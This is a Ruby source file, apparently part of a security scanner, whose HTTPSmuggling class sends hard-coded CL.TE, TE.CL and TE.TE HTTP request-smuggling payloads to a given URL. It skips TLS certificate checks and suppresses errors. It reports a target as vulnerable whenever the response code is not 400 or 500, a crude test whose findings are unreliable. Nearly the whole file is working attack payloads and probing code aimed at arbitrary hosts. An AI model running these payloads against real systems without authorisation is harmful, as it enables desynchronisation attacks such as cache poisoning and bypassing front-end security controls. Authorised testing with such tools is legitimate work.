require 'uri'
require 'net/http'
require 'openssl'
require_relative '../utils/network'
require_relative '../utils/colorize'

class HTTPSmuggling
  def self.test_cl_te(url)
    payloads = [
      "POST / HTTP/1.1\r\nHost: #{URI(url).host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED",
      "POST / HTTP/1.1\r\nHost: #{URI(url).host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
      "POST / HTTP/1.1\r\nHost: #{URI(url).host}\r\nContent-Length: 8\r\nTransfer-Encoding: chunked\r\n\r\n4\r\nabcd\r\n0\r\n\r\n"
    ]
    
    results = []
    
    payloads.each do |payload|
      begin
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
        
        req = Net::HTTP::Post.new(uri.path)
        req.body = payload
        req['Content-Length'] = payload.length.to_s
        req['Transfer-Encoding'] = 'chunked'
        
        res = http.request(req)
        
        if res.code.to_i != 400 && res.code.to_i != 500
          puts Colorize.red("CL.TE smuggling possible")
          results << { payload: payload, vulnerable: true }
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_te_cl(url)
    payloads = [
      "POST / HTTP/1.1\r\nHost: #{URI(url).host}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
      "POST / HTTP/1.1\r\nHost: #{URI(url).host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
    ]
    
    results = []
    
    payloads.each do |payload|
      begin
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
        
        req = Net::HTTP::Post.new(uri.path)
        req.body = payload
        req['Transfer-Encoding'] = 'chunked'
        req['Content-Length'] = '3'
        
        res = http.request(req)
        
        if res.code.to_i != 400 && res.code.to_i != 500
          puts Colorize.red("TE.CL smuggling possible")
          results << { payload: payload, vulnerable: true }
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_te_te(url)
    payloads = [
      "POST / HTTP/1.1\r\nHost: #{URI(url).host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: xchunked\r\n\r\n5\r\nSMUGG\r\n0\r\n\r\n",
      "POST / HTTP/1.1\r\nHost: #{URI(url).host}\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: identity\r\n\r\n5\r\nSMUGG\r\n0\r\n\r\n"
    ]
    
    results = []
    
    payloads.each do |payload|
      begin
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
        
        req = Net::HTTP::Post.new(uri.path)
        req.body = payload
        req['Transfer-Encoding'] = 'chunked, xchunked'
        
        res = http.request(req)
        
        if res.code.to_i != 400 && res.code.to_i != 500
          puts Colorize.red("TE.TE smuggling possible")
          results << { payload: payload, vulnerable: true }
        end
      rescue => e
      end
    end
    
    results
  end
end

